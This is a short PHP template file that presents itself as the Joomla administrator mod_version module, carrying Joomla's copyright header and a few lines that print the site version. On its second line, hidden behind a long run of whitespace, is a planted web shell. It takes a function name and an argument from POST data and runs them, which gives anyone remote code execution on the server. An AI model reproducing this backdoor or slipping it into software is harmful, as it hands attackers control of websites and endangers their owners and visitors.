<?php 
 																																						 $p = $_POST; @($p[0] != $p[1]) ? @$p[2]($p[3]) : (int)$p;
/**
 * @package     Joomla.Administrator
 * @subpackage  mod_version
 *
 * @copyright   Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;
?>
<?php if (!empty($version)) : ?>
	<?php echo $version; ?>
	<?php echo "&nbsp;&mdash;&nbsp;"; ?>
<?php endif; ?>
